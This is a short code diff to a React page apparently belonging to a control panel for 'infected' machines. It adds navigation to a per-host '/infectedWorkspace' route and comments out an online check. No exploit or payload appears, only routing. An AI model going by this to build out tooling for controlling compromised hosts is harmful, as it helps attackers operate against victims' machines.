@@ -29,6 +29,13 @@ export const InfectedPage: React.FC = () => {
 
     const command = (infected: Infected) => {
         console.log(infected.latestIpAddress);
+        console.log(`/infectedWorkspace/${infected.iid}`)
+        //if (infected.online){
+            navigate(`/infectedWorkspace/${infected.iid}`)
+        //}
+        //else {
+        //    console.log(`Infected ${infected.iid} is offline!`);
+        //}
     }
 
     /**
